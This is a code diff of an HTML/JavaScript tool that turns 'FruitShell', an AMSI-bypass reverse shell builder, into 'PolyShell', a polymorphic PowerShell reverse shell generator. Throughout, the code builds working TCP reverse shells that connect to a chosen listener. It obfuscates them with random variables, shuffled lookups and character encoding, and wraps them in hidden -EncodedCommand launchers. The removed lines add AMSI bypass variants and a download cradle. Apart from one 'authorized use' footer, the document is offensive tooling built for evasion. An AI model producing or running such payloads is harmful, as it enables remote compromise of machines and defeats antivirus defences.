@@ -3,12 +3,12 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
-    <title>🍍 FruitShell · Ultimate Stealth</title>
+    <title>PolyShell · Polymorphic Reverse Shell Generator</title>
     <style>
         * { margin:0; padding:0; box-sizing:border-box; }
         body {
-            background: linear-gradient(145deg, #0f1629 0%, #0a0f1e 100%);
-            font-family: 'Inter', system-ui, sans-serif;
+            background: linear-gradient(145deg, #0a0e1a 0%, #060a12 100%);
+            font-family: 'Inter', system-ui, -apple-system, sans-serif;
             min-height: 100vh;
             display: flex;
             justify-content: center;
@@ -19,39 +19,56 @@
         .shell-card {
             max-width: 1180px;
             width: 100%;
-            background: #1a2338;
+            background: #111827;
             border-radius: 24px;
-            border: 1px solid #f4b94233;
-            box-shadow: 0 25px 60px -10px rgba(0,0,0,0.6);
+            border: 1px solid #2a3a5a;
+            box-shadow: 0 25px 60px -10px rgba(0,0,0,0.8);
             overflow: hidden;
         }
         .header {
-            background: #111827;
-            padding: 24px 32px;
+            background: #0d1525;
+            padding: 28px 32px;
             display: flex;
             align-items: center;
-            gap: 16px;
+            gap: 20px;
             flex-wrap: wrap;
+            border-bottom: 1px solid #1a2a44;
         }
-        .fruits { font-size: 28px; }
-        .title {
-            font-size: 2.1rem;
+        .logo-icon {
+            font-size: 32px;
             font-weight: 700;
-            background: linear-gradient(90deg, #ffd966, #ff9f4a);
+            background: linear-gradient(135deg, #60a5fa, #a78bfa);
+            -webkit-background-clip: text;
+            color: transparent;
+            padding: 8px 16px;
+            border-radius: 12px;
+            border: 1px solid #2a3a5a;
+            background-color: #0a0f1e;
+        }
+        .title {
+            font-size: 2.0rem;
+            font-weight: 700;
+            background: linear-gradient(90deg, #60a5fa, #a78bfa, #f472b6);
             -webkit-background-clip: text;
             color: transparent;
         }
+        .subtitle {
+            font-size: 0.9rem;
+            color: #94a3b8;
+            margin-top: 2px;
+        }
         .tag {
-            background: #2c3e2f;
-            color: #c9e9b0;
+            background: #1a2a44;
+            color: #93c5fd;
             padding: 6px 16px;
             border-radius: 9999px;
-            font-size: 0.9rem;
-            border: 1px solid #84b372;
+            font-size: 0.8rem;
+            border: 1px solid #2a4a6a;
+            font-family: 'Fira Code', monospace;
         }
         .input-area {
             padding: 32px;
-            background: #111827;
+            background: #0d1525;
         }
         .input-row {
             display: grid;
@@ -62,23 +79,27 @@
         .label {
             display: block;
             margin-bottom: 8px;
-            font-size: 0.85rem;
+            font-size: 0.8rem;
             text-transform: uppercase;
             letter-spacing: 1px;
-            color: #a3bffa;
+            color: #94a3b8;
+            font-weight: 600;
         }
         input, select {
             width: 100%;
             background: #0a0f1e;
-            border: 2px solid #374151;
-            border-radius: 9999px;
+            border: 2px solid #1a2a44;
+            border-radius: 12px;
             padding: 14px 20px;
             font-size: 1.1rem;
             color: white;
+            font-family: 'Fira Code', monospace;
+            transition: border-color 0.3s;
         }
         input:focus, select:focus {
-            border-color: #f4b942;
+            border-color: #60a5fa;
             outline: none;
+            box-shadow: 0 0 0 3px rgba(96, 165, 250, 0.1);
         }
         .controls {
             display: flex;
@@ -86,268 +107,535 @@
             gap: 16px;
             align-items: center;
             margin: 20px 0;
+            padding: 16px;
+            background: #0a0f1e;
+            border-radius: 12px;
+            border: 1px solid #1a2a44;
+        }
+        .controls label {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            font-size: 0.9rem;
+            color: #c8d6e5;
+            cursor: pointer;
+        }
+        .controls input[type="checkbox"] {
+            width: auto;
+            padding: 0;
+            margin: 0;
+            accent-color: #60a5fa;
+            transform: scale(1.1);
         }
         .btn {
-            padding: 12px 24px;
-            border-radius: 9999px;
+            padding: 12px 28px;
+            border-radius: 12px;
             font-weight: 600;
             cursor: pointer;
             transition: all 0.2s;
             border: none;
+            font-size: 0.95rem;
         }
         .btn-primary {
-            background: linear-gradient(90deg, #f59e0b, #fb923c);
-            color: #111827;
-            font-size: 1.05rem;
+            background: linear-gradient(135deg, #60a5fa, #7c3aed);
+            color: white;
+            box-shadow: 0 4px 15px rgba(96, 165, 250, 0.3);
         }
-        .btn-primary:hover { transform: translateY(-2px); }
+        .btn-primary:hover { 
+            transform: translateY(-2px);
+            box-shadow: 0 6px 20px rgba(96, 165, 250, 0.4);
+        }
+        .btn-secondary {
+            background: #1a2a44;
+            color: #e2e9ff;
+            border: 1px solid #2a3a5a;
+        }
+        .btn-secondary:hover { 
+            background: #2a3a5a;
+            transform: translateY(-1px);
+        }
+        .btn-danger {
+            background: #1a2a44;
+            color: #f472b6;
+            border: 1px solid #4a1a3a;
+        }
+        .btn-danger:hover { 
+            background: #2a1a3a;
+        }
         .output-box {
             background: #0a0f1e;
-            border-radius: 16px;
-            padding: 18px;
+            border-radius: 12px;
+            padding: 20px;
             margin-top: 16px;
-            border: 1px solid #374151;
-            font-family: 'Fira Code', monospace;
-            font-size: 0.85rem;
-            line-height: 1.5;
+            border: 1px solid #1a2a44;
+            font-family: 'Fira Code', 'Consolas', monospace;
+            font-size: 0.82rem;
+            line-height: 1.6;
             color: #e0e7ff;
             white-space: pre-wrap;
             overflow-x: auto;
-            max-height: 380px;
+            max-height: 400px;
+            position: relative;
+        }
+        .output-box::-webkit-scrollbar {
+            width: 8px;
+            height: 8px;
+        }
+        .output-box::-webkit-scrollbar-track {
+            background: #0a0f1e;
+        }
+        .output-box::-webkit-scrollbar-thumb {
+            background: #1a2a44;
+            border-radius: 4px;
+        }
+        .output-box::-webkit-scrollbar-thumb:hover {
+            background: #2a3a5a;
         }
         .output-header {
-            background: #1f2937;
-            padding: 8px 16px;
-            border-radius: 9999px;
-            font-size: 0.9rem;
+            background: #0d1525;
+            padding: 10px 18px;
+            border-radius: 12px;
+            font-size: 0.85rem;
             margin-bottom: 12px;
             display: inline-flex;
             align-items: center;
-            gap: 8px;
+            gap: 10px;
+            border: 1px solid #1a2a44;
+            font-weight: 600;
+            color: #94a3b8;
+        }
+        .output-header .badge {
+            background: #1a2a44;
+            padding: 2px 10px;
+            border-radius: 9999px;
+            font-size: 0.7rem;
+            color: #60a5fa;
         }
         footer {
             text-align: center;
-            padding: 18px;
+            padding: 20px;
             font-size: 0.8rem;
-            color: #64748b;
-            background: #111827;
+            color: #4a5a7a;
+            background: #0d1525;
+            border-top: 1px solid #1a2a44;
+            font-family: 'Fira Code', monospace;
         }
-        .flash { animation: flash 800ms; }
-        @keyframes flash { 0%,100% { background:#1f2937; } 50% { background:#374151; } }
+        .flash { 
+            animation: flash 600ms ease;
+        }
+        @keyframes flash { 
+            0%,100% { background: #0a0f1e; } 
+            50% { background: #1a2a4a; } 
+        }
+        .btn:disabled {
+            opacity: 0.4;
+            cursor: not-allowed;
+            transform: none !important;
+        }
+        .status-badge {
+            display: inline-block;
+            padding: 4px 14px;
+            border-radius: 9999px;
+            font-size: 0.7rem;
+            font-weight: 600;
+            background: #0a1a2a;
+            color: #60a5fa;
+            border: 1px solid #1a3a5a;
+            font-family: 'Fira Code', monospace;
+        }
+        .btn-group {
+            display: flex;
+            gap: 10px;
+            flex-wrap: wrap;
+        }
+        @media (max-width: 768px) {
+            .input-row {
+                grid-template-columns: 1fr;
+            }
+            .header {
+                flex-direction: column;
+                align-items: flex-start;
+            }
+            .controls {
+                flex-direction: column;
+                align-items: stretch;
+            }
+            .btn-group {
+                flex-direction: column;
+            }
+            .btn {
+                width: 100%;
+                justify-content: center;
+            }
+        }
+        .copy-indicator {
+            position: absolute;
+            top: 8px;
+            right: 12px;
+            font-size: 0.7rem;
+            color: #4a5a7a;
+            background: #0a0f1e;
+            padding: 2px 10px;
+            border-radius: 4px;
+            border: 1px solid #1a2a44;
+            opacity: 0;
+            transition: opacity 0.3s;
+        }
+        .output-box:hover .copy-indicator {
+            opacity: 1;
+        }
+        .tech-stack {
+            display: flex;
+            gap: 8px;
+            flex-wrap: wrap;
+            margin-top: 10px;
+        }
+        .tech-item {
+            background: #0a0f1e;
+            padding: 4px 12px;
+            border-radius: 9999px;
+            font-size: 0.7rem;
+            color: #94a3b8;
+            border: 1px solid #1a2a44;
+        }
     </style>
 </head>
 <body>
 <div class="shell-card">
     <div class="header">
-        <div class="fruits">🍒🍊🍉🍍🥝🍓</div>
+        <div class="logo-icon">⬡</div>
         <div>
-            <div class="title">FruitShell · Ultimate Stealth</div>
-            <div class="tag">AMSI Variants + UTF-16LE + Reversal 🍇</div>
+            <div class="title">PolyShell</div>
+            <div class="subtitle">Polymorphic Reverse Shell Generator</div>
+        </div>
+        <div style="margin-left: auto; display: flex; gap: 8px; flex-wrap: wrap;">
+            <span class="tag">v2.0</span>
+            <span class="tag">Random per gen</span>
+            <span class="tag">Stealth</span>
         </div>
     </div>
 
     <div class="input-area">
         <div class="input-row">
             <div>
-                <div class="label">🍎 LISTENER IP / HOSTNAME</div>
+                <div class="label">LISTENER ADDRESS</div>
                 <input type="text" id="ip" placeholder="192.168.45.45" value="192.168.45.45">
             </div>
             <div>
-                <div class="label">🍊 PORT</div>
+                <div class="label">PORT</div>
                 <input type="text" id="port" placeholder="443" value="443">
             </div>
         </div>
 
-        <div>
-            <div class="label">AMSI BYPASS VARIANT</div>
-            <select id="amsiVariant">
-                <option value="0">Classic Concat</option>
-                <option value="1" selected>Double Split (Heavy Fruit Style)</option>
-                <option value="2">Reflected + Random Case</option>
-                <option value="3">Minimal InitFailed Only</option>
-            </select>
+        <div style="margin-bottom: 16px;">
+            <div class="label">OBFUSCATION ENGINE</div>
+            <div class="tech-stack">
+                <span class="tech-item">Random Variables</span>
+                <span class="tech-item">Shuffled Lookups</span>
+                <span class="tech-item">Char Arithmetic</span>
+                <span class="tech-item">Int-Array Encoding</span>
+                <span class="tech-item">Dynamic Buffer</span>
+                <span class="tech-item">Pipeline Padding</span>
+            </div>
         </div>
 
         <div class="controls">
-            <div>
-                <label>Stealth Level: </label>
-                <input type="range" id="stealthLevel" min="1" max="4" value="3" style="width:200px;">
-                <span id="levelDisplay" style="margin-left:10px; color:#f4b942;">Level 3 🍓</span>
-            </div>
-            <label><input type="checkbox" id="ultraMode" checked> Extra Fruit Chaos</label>
-            <label><input type="checkbox" id="compressMode" checked> Compress + EncodedCommand</label>
-            <label><input type="checkbox" id="utf16Mode" checked> UTF-16LE Encoding</label>
-            <label><input type="checkbox" id="cradleMode"> Use Download Cradle</label>
-            <label><input type="checkbox" id="oneLinerMode"> Force One-Liner</label>
+            <label>
+                <input type="checkbox" id="b64Mode" checked>
+                Base64 Launcher
+            </label>
+            <label>
+                <input type="checkbox" id="oneLinerMode">
+                One-Liner
+            </label>
+            <label>
+                <input type="checkbox" id="utf16Mode" checked>
+                UTF-16LE
+            </label>
+            <label>
+                <input type="checkbox" id="compressMode">
+                Compress
+            </label>
+            <span style="color: #4a5a7a; font-size: 0.8rem; margin-left: auto;">
+                <span id="generationId">#G-0000</span>
+            </span>
         </div>
 
-        <div style="display:flex; gap:12px; flex-wrap:wrap; margin-top:20px;">
-            <button class="btn btn-primary" id="generateBtn">🍍 GENERATE ULTIMATE FRUIT SHELL 🍍</button>
-            <button class="btn" style="background:#374151; color:white;" id="copyPayloadBtn" disabled>📋 Copy Payload</button>
-            <button class="btn" style="background:#374151; color:white;" id="copyEncodedBtn" disabled>📋 Copy EncodedCommand</button>
-            <button class="btn" style="background:#374151; color:white;" id="copyFullBtn" disabled>📋 Copy Full Command</button>
-            <button class="btn" style="background:#374151; color:white;" id="clearBtn">🧹 Clear</button>
+        <div class="btn-group">
+            <button class="btn btn-primary" id="generateBtn">Generate Shell</button>
+            <button class="btn btn-secondary" id="copyPayloadBtn" disabled>Copy Payload</button>
+            <button class="btn btn-secondary" id="copyEncodedBtn" disabled>Copy Encoded</button>
+            <button class="btn btn-secondary" id="copyFullBtn" disabled>Copy Command</button>
+            <button class="btn btn-danger" id="clearBtn">Clear</button>
         </div>
     </div>
 
-    <!-- Obfuscated / Encoded Output -->
+    <!-- Obfuscated Output -->
     <div style="padding:0 32px 20px;">
-        <div class="output-header">🔒 FRUIT-OBFUSCATED STEALTH PAYLOAD</div>
-        <div id="obfuscatedOutput" class="output-box"># Click Generate to create payload...</div>
+        <div class="output-header">
+            <span>OBFUSCATED PAYLOAD</span>
+            <span class="badge">polymorphic</span>
+            <span class="badge" style="background: #1a2a44; color: #f472b6;">randomized</span>
+        </div>
+        <div id="obfuscatedOutput" class="output-box">
+            <span style="color: #4a5a7a;"># Click Generate to create polymorphic payload...</span>
+            <span class="copy-indicator">click to copy</span>
+        </div>
     </div>
 
-    <!-- Decoded / Readable Output -->
+    <!-- Decoded Output -->
     <div style="padding:0 32px 32px;">
-        <div class="output-header">📜 DECODED / READABLE VERSION</div>
-        <div id="decodedOutput" class="output-box"># Decoded version will appear here after generation...</div>
+        <div class="output-header">
+            <span>READABLE VERSION</span>
+            <span class="badge">debug</span>
+        </div>
+        <div id="decodedOutput" class="output-box">
+            <span style="color: #4a5a7a;"># Decoded version will appear here after generation...</span>
+            <span class="copy-indicator">click to copy</span>
+        </div>
     </div>
 
     <footer>
-        🍌 Multiple AMSI bypass variants • Fruit obfuscation • UTF-16LE • String reversal • Use only on authorized targets
+        <span style="color: #4a5a7a;">⬡</span> 
+        Polymorphic obfuscation engine · Each generation is unique · 
+        <span style="color: #2a4a6a;">Authorized use only</span>
+        <span style="display: block; margin-top: 4px; font-size: 0.7rem; color: #2a3a5a;">
+            Techniques: Variable Randomization · Shuffled Alphabets · Char Arithmetic · Int-Array Encoding
+        </span>
     </footer>
 </div>
 
 <script>
-    // ... (same fruitBase, getRandomFruit, randomCase, obfuscateString, reverseString, getAmsiBypass, toUtf16LEBase64 functions as before)
+// Core obfuscation primitives
+let generationCounter = 0;
 
-    const fruitBase = ["mango","kiwi","lychee","papaya","guava","dragon","passion","starfruit","durian","jackfruit","rambutan","mangosteen","pitaya","tamarind","persimmon","quince","boysen","elder","goose","currant","pineapple","cherry","banana","orange","lime","lemon"];
-
-    function getRandomFruit(used) {
-        let avail = fruitBase.filter(f => !used.has(f));
-        if (avail.length === 0) avail = [...fruitBase];
-        const picked = avail[Math.floor(Math.random() * avail.length)];
-        used.add(picked);
-        return picked;
+function randVar(minLen = 4, maxLen = 20) {
+    const pool = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
+    const first = pool[Math.floor(Math.random() * 52)];
+    const len = Math.floor(Math.random() * (maxLen - minLen + 1)) + minLen;
+    let rest = '';
+    for (let i = 0; i < len - 1; i++) {
+        rest += pool[Math.floor(Math.random() * pool.length)];
     }
-
-    function randomCase(str) { return str.split('').map(c => Math.random() > 0.5 ? c.toUpperCase() : c.toLowerCase()).join(''); }
-    function obfuscateString(str, level) {
-        let result = ''; const used = new Set();
-        for (let char of str) {
-            if (Math.random() < 0.4 + level * 0.2) {
-                const f = getRandomFruit(used);
-                result += `$${f}='${char}';`;
-            } else result += `'${char}' + `;
-        }
-        return result.replace(/\s*\+\s*$/, '');
-    }
-    function reverseString(s) { return s.split('').reverse().join(''); }
-
-    function getAmsiBypass(variant, stealthLevel) {
-        const used = new Set(); const f = () => getRandomFruit(used);
-        if (variant === "0") return `$a='System.Management.Automation.A';$b='msiUtils';$c=[Ref].Assembly.GetType($a+$b);$d=$c.GetField('amsiInitFailed','NonPublic,Static');$d.SetValue($null,$true);`;
-        if (variant === "1") {
-            let a1 = obfuscateString('System.Management.Automation.', stealthLevel);
-            let a2 = obfuscateString('AmsiUtils', stealthLevel);
-            return `${a1}$b=${a2};$c=[Ref].Assembly.GetType($a+$b);$d=$c.GetField('amsiInitFailed','NonPublic,Static');$d.SetValue($null,$true);`;
-        }
-        if (variant === "2") return `$${f()}=[Ref].Assembly.GetType('${randomCase('System.Management.Automation.AmsiUtils')}');$${f()}=$${f()}.GetField('${randomCase('amsiInitFailed')}','NonPublic,Static');$${f()}.SetValue($null,$true);`;
-        if (variant === "3") return `[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true);`;
-        return '';
-    }
-
-    function toUtf16LEBase64(str) {
-        let utf16le = '';
-        for (let i = 0; i < str.length; i++) utf16le += str.charCodeAt(i) + '\0';
-        return btoa(utf16le);
-    }
-
-    function generateUltimateFruitShell(ip, portStr, stealthLevel, ultra, compress, utf16, cradle, oneLiner, amsiVariant) {
-        const used = new Set(); const f = () => getRandomFruit(used);
-        const amsiBypass = getAmsiBypass(amsiVariant, stealthLevel);
-
-        const client = f(), stream = f(), writer = f(), buffer = f(), data = f(), raw = f();
-        let ipAssignments = '', ipExprParts = [];
-        ip.split('').forEach(char => {
-            const v = f();
-            ipAssignments += `$${v}='${char}';`;
-            ipExprParts.push(`$${v}`);
-        });
-        const ipExpr = ipExprParts.join('+');
-        let portExpr = `'${portStr}'`;
-        if (stealthLevel >= 3) portExpr = portStr.split('').map(c => `'${c}'`).join(' + ');
-
-        let iexReversed = reverseString('xei');
-
-        let core = `${amsiBypass}
-$ErrorActionPreference = 'SilentlyContinue';
-${ipAssignments}
-$${client} = New-Object (${obfuscateString('System.Net.Sockets.TCPClient', stealthLevel)})(${ipExpr}, ${portExpr});
-$${stream} = $${client}.GetStream();
-$${writer} = New-Object System.IO.StreamWriter($${stream});
-$${buffer} = New-Object Byte[] 4096;
-while (($${data} = $${stream}.Read($${buffer}, 0, $${buffer}.Length)) -ne 0) {
-    $${raw} = (New-Object System.Text.UTF8Encoding).GetString($${buffer}, 0, $${data});
-    $exec = &([string]::join('', '${iexReversed}'[(${iexReversed}.Length-1)..0])) $${raw} 2>&1 | Out-String;
-    $${writer}.WriteLine($exec); $${writer}.Flush();
+    return first + rest;
 }
-$${client}.Close();`.trim();
 
-        if (ultra) core = core.replace(/New-Object/g, randomCase('New-Object'));
-        if (cradle) core = `IEX((New-Object Net.WebClient).DownloadString('http://${ip}:${portStr}/payload.ps1'));\n` + core;
-
-        const readable = core;
-
-        if (compress) {
-            const encoded = utf16 ? toUtf16LEBase64(core) : btoa(unescape(encodeURIComponent(core)));
-            const fullEncoded = `powershell -NoP -NonI -W Hidden -Exec Bypass -EncodedCommand ${encoded}`;
-            return { obfuscated: fullEncoded, decoded: readable };
-        }
-
-        if (oneLiner) core = core.replace(/\s+/g, ' ').trim();
-        return { obfuscated: core, decoded: readable };
+function shuffledLookup(target) {
+    const needed = [...new Set(target.split(''))];
+    const fillerPool = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789-_'.split('')
+        .filter(c => !needed.includes(c));
+    for (let i = fillerPool.length - 1; i > 0; i--) {
+        const j = Math.floor(Math.random() * (i + 1));
+        [fillerPool[i], fillerPool[j]] = [fillerPool[j], fillerPool[i]];
     }
+    const pad = fillerPool.slice(0, Math.floor(Math.random() * 25) + 30);
+    const alphabet = [...needed, ...pad];
+    for (let i = alphabet.length - 1; i > 0; i--) {
+        const j = Math.floor(Math.random() * (i + 1));
+        [alphabet[i], alphabet[j]] = [alphabet[j], alphabet[i]];
+    }
+    const alphaStr = alphabet.join('');
 
-    // DOM
-    const ipInput = document.getElementById('ip');
-    const portInput = document.getElementById('port');
-    const stealthSlider = document.getElementById('stealthLevel');
-    const levelDisplay = document.getElementById('levelDisplay');
-    const amsiSelect = document.getElementById('amsiVariant');
-    const ultraChk = document.getElementById('ultraMode');
-    const compressChk = document.getElementById('compressMode');
-    const utf16Chk = document.getElementById('utf16Mode');
-    const cradleChk = document.getElementById('cradleMode');
-    const oneLinerChk = document.getElementById('oneLinerMode');
-    const generateBtn = document.getElementById('generateBtn');
-    const obfuscatedOutput = document.getElementById('obfuscatedOutput');
-    const decodedOutput = document.getElementById('decodedOutput');
-
-    const copyPayloadBtn = document.getElementById('copyPayloadBtn');
-    const copyEncodedBtn = document.getElementById('copyEncodedBtn');
-    const copyFullBtn = document.getElementById('copyFullBtn');
-    const clearBtn = document.getElementById('clearBtn');
-
-    stealthSlider.addEventListener('input', () => {
-        const lvl = parseInt(stealthSlider.value);
-        const emojis = ['🥭','🍉','🍓','🍒'];
-        levelDisplay.textContent = `Level ${lvl} ${emojis[lvl-1]}`;
+    const indices = target.split('').map(ch => {
+        const positions = [];
+        for (let i = 0; i < alphaStr.length; i++) {
+            if (alphaStr[i] === ch) positions.push(i);
+        }
+        return positions[Math.floor(Math.random() * positions.length)];
     });
 
-    function handleGenerate() {
-        const ip = ipInput.value.trim();
-        const portStr = portInput.value.trim();
-        if (!ip || !portStr || isNaN(parseInt(portStr))) {
-            obfuscatedOutput.textContent = '⚠️ Please fill IP and valid Port';
-            return;
+    return `("${alphaStr}")[${indices.join(',')}] -join ''`;
+}
+
+function charArithmetic(s) {
+    const parts = [];
+    for (let i = 0; i < s.length; i++) {
+        const v = s.charCodeAt(i);
+        const style = Math.random() < 0.5 ? 'mul' : 'add';
+        if (style === 'mul' && v !== 0) {
+            const m = Math.floor(Math.random() * 126) + 2;
+            parts.push(`[char](${m}*${v}/${m})`);
+        } else {
+            const m = Math.floor(Math.random() * 101);
+            parts.push(`[char](${m}+${v}-${m})`);
+        }
+    }
+    return parts.join('+');
+}
+
+function intArrayEncode(s) {
+    const ints = s.split('').map(c => c.charCodeAt(0)).join(',');
+    if (Math.random() < 0.5) {
+        return `([string]::join('', ( (${ints}) |ForEach-Object{$_}|%{ ( [char][int] $_)}))|ForEach-Object{$_}| % {$_{}})`;
+    } else {
+        return `([string]::join('', ( (${ints}) |%{ ( [char][int] $_)}))| % {$_{}})`;
+    }
+}
+
+function randBufsize() {
+    const styles = [
+        '(65535)',
+        '(0-0+65535)',
+        '(65535+0)',
+        '(65536-1)',
+        '(0x0000+65535)',
+        '(65535-0)',
+        '(0+65535)',
+    ];
+    return styles[Math.floor(Math.random() * styles.length)];
+}
+
+function randForeach() {
+    const opts = [
+        '|ForEach-Object{$_}',
+        '|%{$_}',
+        '|ForEach-Object{$_}|%{$_}',
+        '|%{$_}|ForEach-Object{$_}',
+    ];
+    return opts[Math.floor(Math.random() * opts.length)];
+}
+
+function generatePolymorphicPayload(ip, port) {
+    const v_client = randVar();
+    const v_stream = randVar();
+    const v_buf = randVar();
+    const v_nread = randVar();
+    const v_text = randVar();
+    const v_result = randVar();
+    const v_prompt = randVar();
+    const v_outbytes = randVar();
+
+    const new_obj_a = shuffledLookup('New-Object');
+    const new_obj_b = shuffledLookup('New-Object');
+    const invoke_expr = shuffledLookup('Invoke-Expression');
+    const out_str = shuffledLookup('Out-String');
+    const get_loc = shuffledLookup('Get-Location');
+    
+    const invoke_low = Math.random() < 0.5 
+        ? shuffledLookup('invoke-expression')
+        : intArrayEncode('invoke-expression');
+
+    const tcp_class = charArithmetic('System.Net.Sockets.TcpClient');
+
+    const ascii_class = Math.random() < 0.5
+        ? `$(${charArithmetic('System.Text.ASCIIEncoding')})`
+        : intArrayEncode('System.Text.ASCIIEncoding');
+
+    const flush_expr = Math.random() < 0.5
+        ? `$${v_stream}.Flush()`
+        : intArrayEncode(`$${v_stream}.Flush()`);
+    
+    const close_expr = intArrayEncode(`$${v_client}.Close()`);
+
+    const buf_expr = randBufsize();
+    const fe1 = randForeach();
+    const fe2 = randForeach();
+    const fe3 = randForeach();
+
+    const flush_line = Math.random() < 0.5
+        ? `    ((${flush_expr}))`
+        : `    $((& (${invoke_low})(${intArrayEncode(`$${v_stream}.Flush()`)}) | % {{$_}}))`;
+
+    const script = 
+        `$${v_client} = & (${new_obj_a}) ` +
+        `$(${tcp_class})("${ip}", "${port}");\n` +
+        `$${v_stream} = ($${v_client}.GetStream());` +
+        `[byte[]]$${v_buf} = 0..$(${buf_expr})${fe1}|%{0};\n` +
+        `while(($${v_nread} = $${v_stream}.Read($${v_buf}, 0, $${v_buf}.Length)) -ne 0){\n` +
+        `    $${v_text} = (& (${new_obj_b}) -TypeName ` +
+        `${ascii_class}).GetString($${v_buf},0, $${v_nread});\n` +
+        `    $${v_result} = (& (${invoke_expr}) $${v_text} 2>&1 ` +
+        `${fe2}| & (${out_str}) );\n` +
+        `    $${v_prompt} = $${v_result} + 'PS ' + ` +
+        `(& (${get_loc})).Path + '> ';\n` +
+        `    $${v_outbytes} = ([text.encoding]::ASCII).GetBytes($${v_prompt});\n` +
+        `    $${v_stream}.Write($${v_outbytes},0,$${v_outbytes}.Length);\n` +
+        `${flush_line}\n` +
+        `};\n` +
+        `$((& (${invoke_low})` +
+        `(${close_expr}) | % {{$_}}));`;
+
+    return script;
+}
+
+function toUtf16LEBase64(str) {
+    let utf16le = '';
+    for (let i = 0; i < str.length; i++) {
+        utf16le += String.fromCharCode(str.charCodeAt(i)) + '\0';
+    }
+    return btoa(utf16le);
+}
+
+function compressPayload(str) {
+    return str.replace(/;\s*/g, ';').replace(/\s{2,}/g, ' ').trim();
+}
+
+// DOM Handling
+const ipInput = document.getElementById('ip');
+const portInput = document.getElementById('port');
+const b64Chk = document.getElementById('b64Mode');
+const oneLinerChk = document.getElementById('oneLinerMode');
+const utf16Chk = document.getElementById('utf16Mode');
+const compressChk = document.getElementById('compressMode');
+const generateBtn = document.getElementById('generateBtn');
+const obfuscatedOutput = document.getElementById('obfuscatedOutput');
+const decodedOutput = document.getElementById('decodedOutput');
+const copyPayloadBtn = document.getElementById('copyPayloadBtn');
+const copyEncodedBtn = document.getElementById('copyEncodedBtn');
+const copyFullBtn = document.getElementById('copyFullBtn');
+const clearBtn = document.getElementById('clearBtn');
+const generationIdSpan = document.getElementById('generationId');
+
+let currentPayload = '';
+let currentEncoded = '';
+
+function handleGenerate() {
+    const ip = ipInput.value.trim();
+    const port = portInput.value.trim();
+    
+    if (!ip || !port || isNaN(parseInt(port))) {
+        obfuscatedOutput.textContent = 'Please fill IP and valid Port';
+        return;
+    }
+
+    try {
+        generationCounter++;
+        generationIdSpan.textContent = `#G-${String(generationCounter).padStart(4, '0')}`;
+        
+        let payload = generatePolymorphicPayload(ip, port);
+        currentPayload = payload;
+
+        let displayPayload = payload;
+        let readablePayload = payload;
+
+        if (compressChk.checked) {
+            payload = compressPayload(payload);
+            displayPayload = payload;
+            readablePayload = payload;
         }
 
-        const result = generateUltimateFruitShell(
-            ip, portStr,
-            parseInt(stealthSlider.value),
-            ultraChk.checked,
-            compressChk.checked,
-            utf16Chk.checked,
-            cradleChk.checked,
-            oneLinerChk.checked,
-            amsiSelect.value
-        );
+        if (oneLinerChk.checked) {
+            displayPayload = payload.replace(/\s+/g, ' ').trim();
+            readablePayload = displayPayload;
+        }
 
-        obfuscatedOutput.textContent = result.obfuscated;
-        decodedOutput.textContent = result.decoded;
+        if (b64Chk.checked) {
+            const encoded = utf16Chk.checked 
+                ? toUtf16LEBase64(payload)
+                : btoa(unescape(encodeURIComponent(payload)));
+            currentEncoded = encoded;
+            const launcher = `powershell -NoP -NonI -W Hidden -Exec Bypass -EncodedCommand ${encoded}`;
+            displayPayload = launcher;
+            obfuscatedOutput.innerHTML = `# Base64 Launcher:\n${launcher}\n\n# EncodedCommand:\n${encoded}`;
+        } else {
+            currentEncoded = '';
+            obfuscatedOutput.textContent = displayPayload;
+        }
+
+        decodedOutput.textContent = `# Readable version:\n${readablePayload}`;
 
         copyPayloadBtn.disabled = false;
-        copyEncodedBtn.disabled = !compressChk.checked;
+        copyEncodedBtn.disabled = false;
         copyFullBtn.disabled = false;
 
         obfuscatedOutput.classList.add('flash');
@@ -355,31 +643,107 @@ $${client}.Close();`.trim();
         setTimeout(() => {
             obfuscatedOutput.classList.remove('flash');
             decodedOutput.classList.remove('flash');
-        }, 800);
+        }, 600);
+
+    } catch (error) {
+        obfuscatedOutput.textContent = `Error: ${error.message}`;
+        console.error(error);
     }
+}
 
-    function copyToClipboard(text, btn) {
-        navigator.clipboard.writeText(text).then(() => {
-            const orig = btn.textContent;
-            btn.textContent = '✅ Copied!';
-            setTimeout(() => btn.textContent = orig, 1600);
-        });
+function copyToClipboard(text, btn) {
+    navigator.clipboard.writeText(text).then(() => {
+        const orig = btn.textContent;
+        btn.textContent = 'Copied!';
+        setTimeout(() => btn.textContent = orig, 1600);
+    }).catch(() => {
+        const textarea = document.createElement('textarea');
+        textarea.value = text;
+        document.body.appendChild(textarea);
+        textarea.select();
+        document.execCommand('copy');
+        document.body.removeChild(textarea);
+        const orig = btn.textContent;
+        btn.textContent = 'Copied!';
+        setTimeout(() => btn.textContent = orig, 1600);
+    });
+}
+
+generateBtn.addEventListener('click', handleGenerate);
+
+copyPayloadBtn.addEventListener('click', () => {
+    const text = obfuscatedOutput.textContent;
+    copyToClipboard(text, copyPayloadBtn);
+});
+
+copyEncodedBtn.addEventListener('click', () => {
+    if (currentEncoded) {
+        copyToClipboard(currentEncoded, copyEncodedBtn);
+    } else {
+        const text = obfuscatedOutput.textContent;
+        const encodedMatch = text.match(/-EncodedCommand\s+(\S+)/);
+        if (encodedMatch) {
+            copyToClipboard(encodedMatch[1], copyEncodedBtn);
+        } else if (b64Chk.checked) {
+            const parts = text.split('\n\n');
+            if (parts.length > 1) {
+                const encodedPart = parts[1].replace('# EncodedCommand:', '').trim();
+                copyToClipboard(encodedPart, copyEncodedBtn);
+            } else {
+                copyToClipboard(text, copyEncodedBtn);
+            }
+        } else {
+            copyToClipboard(text, copyEncodedBtn);
+        }
     }
+});
 
-    generateBtn.addEventListener('click', handleGenerate);
-    copyPayloadBtn.addEventListener('click', () => copyToClipboard(obfuscatedOutput.textContent, copyPayloadBtn));
-    copyEncodedBtn.addEventListener('click', () => copyToClipboard(obfuscatedOutput.textContent, copyEncodedBtn));
-    copyFullBtn.addEventListener('click', () => {
-        const full = `powershell -NoP -NonI -W Hidden -Exec Bypass -c "${obfuscatedOutput.textContent.replace(/"/g, '`"')}"`;
-        copyToClipboard(full, copyFullBtn);
-    });
